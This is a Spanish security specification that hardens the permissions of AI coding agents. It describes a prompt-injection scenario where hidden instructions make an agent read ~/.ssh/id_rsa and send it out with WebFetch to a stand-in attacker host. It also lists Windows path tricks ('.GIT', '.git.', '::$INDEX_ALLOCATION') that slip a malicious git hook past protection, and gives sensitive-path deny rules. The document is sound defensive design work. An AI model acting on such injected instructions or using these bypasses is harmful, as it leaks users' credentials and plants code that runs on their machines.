# SPEC-087 · Confinamiento de los agentes

**Estado:** Implementada · **Hito:** M16f · **Paquetes:** `claude`, `editor` · **Rama:** `feature/seguridad-1.0`

## Propósito
La auditoría para la 1.0 (09/11/2026) encontró dos fallos altos en la política de los agentes (SPEC-031, SPEC-047, SPEC-050):

- **A2.** En Windows, `.git`, `.orquestador` y `node_modules` solo se protegían escritos en minúsculas exactas. `Write .GIT/hooks/pre-commit` se permitía como «archivo nuevo dentro de la carpeta», y el hook se ejecutaba en el siguiente `git commit` del usuario. También pasaban `.git.` (Windows quita el punto final) y `.git::$INDEX_ALLOCATION` (flujo alternativo de NTFS).
- **A1.** `Read`, `Glob`, `Grep`, `WebFetch` y `WebSearch` se aprobaban siempre, sin pasar por la política, también en «Solo lectura». Un texto con instrucciones escondidas (un README, una web) podía llevar a un agente a leer `~/.ssh/id_rsa` y mandarlo fuera con `WebFetch https://atacante/?d=…`. La interfaz decía «pueden leer la carpeta de trabajo».

## Decisiones (09/11/2026, del usuario)
1. **Rutas sensibles, nunca.** Las mismas que ya protegen al asistente (SPEC-029: `.ssh`, `.aws`, `.gnupg`, claves, `.env`, credenciales…) más la carpeta de datos de la app. Se deniegan en todos los niveles, también dentro de la carpeta de trabajo.
2. **Fuera de la carpeta, según el nivel.** Dentro de la carpeta de trabajo, del proyecto y de `~/.claude` (lo de Claude Code; su `.credentials.json` sigue protegido) se lee sin preguntar. Fuera: se pregunta en «Solo lectura» y «Preguntar»; en «Automático» y «Sin preguntar nunca», se permite.
3. **Web por dominio.** En «Solo lectura» y «Preguntar», la primera vez que una ejecución usa un dominio con `WebFetch` se pregunta, y la respuesta vale para el resto de la ejecución. `WebSearch` pregunta una vez por ejecución. En «Automático» y «Sin preguntar nunca», sin preguntar.

## Requisitos

### A2 · Carpetas protegidas en Windows
- **R87.1** [M16f] `protectedName(segment, platform)` reconoce `.git`, `node_modules` y `.orquestador` en cualquier combinación de mayúsculas. En Windows, además, quita los puntos y espacios del final y lo que va desde `:` (flujos alternativos). `confine` y las redirecciones de Bash (`isProtected`) lo usan: `.GIT/hooks/x`, `.Orquestador/agents/a.json`, `.git./config` y `.git::$INDEX_ALLOCATION/x` quedan fuera.
- **R87.2** [M16f] Con «Sin preguntar nunca», la carpeta de la app (`appDirs`) también se reconoce así: `.ORQUESTADOR/x` o `.orquestador./x` se deniegan.

### A1 · Lecturas
- **R87.3** [M16f] En los pasos de agente, `Read`, `Glob` y `Grep` pasan por la política: ya no están en `allowedTools` y el gancho `PreToolUse` no las salta. Las consultas sin herramientas (decisiones, borradores) no cambian.
- **R87.4** [M16f] Una lectura cuya ruta o patrón (`file_path`, `path`, `pattern`, `glob`) es sensible (`isSensitivePath`, con la carpeta de datos de la app como protegida) se deniega en todos los niveles con `SENSITIVE_DENY` y queda registrada.
- **R87.5** [M16f] Una lectura dentro de la carpeta de trabajo, de la carpeta del proyecto o de `~/.claude` (entera: Claude Code guarda ahí lo suyo; `.credentials.json` sigue siendo un secreto) se permite sin preguntar. Un patrón sin ruta (Glob o Grep sin `path`) busca en la carpeta de trabajo.
- **R87.6** [M16f] Una lectura fuera de esas carpetas: en «Automático» y «Sin preguntar nunca» se permite; en «Solo lectura» y «Preguntar» se pregunta «¿Puedo leer fuera de la carpeta de trabajo? <ruta>» con «Permitir», «Permitir en esta ejecución» y «Denegar». «Permitir en esta ejecución» vale para todas las lecturas de fuera de esa ejecución.
- **R87.7** [M16f] `.credentials.json` cuenta como sensible.

### A1 · Web
- **R87.8** [M16f] `WebFetch` en «Solo lectura» y «Preguntar» pregunta «¿Puedo abrir <dominio>?» la primera vez que la ejecución usa ese dominio, con «Permitir <dominio> en esta ejecución» y «Denegar». Una URL no válida se deniega. En «Automático» y «Sin preguntar nunca» se permite.
- **R87.9** [M16f] `WebSearch` en «Solo lectura» y «Preguntar» pregunta una vez por ejecución «¿Puedo buscar en la web?».

### Textos
- **R87.10** [M16f] Los textos de la interfaz y el prompt de los agentes dicen lo que pasa: se lee la carpeta de trabajo; fuera, se pregunta según el nivel; los archivos de secretos nunca se leen; y la web pide permiso por dominio en «Solo lectura» y «Preguntar».

## Casos
- **E87.a** *Dado* un agente «Solo lectura», *cuando* intenta `Read ~/.ssh/id_rsa`, *entonces* se deniega sin preguntar; *cuando* intenta `WebFetch https://atacante.example/?d=x`, *entonces* se pregunta por `atacante.example` y, si se deniega, no se abre.
- **E87.b** *Dado* un agente «Preguntar» en Windows, *cuando* intenta `Write .GIT/hooks/pre-commit`, *entonces* se deniega.
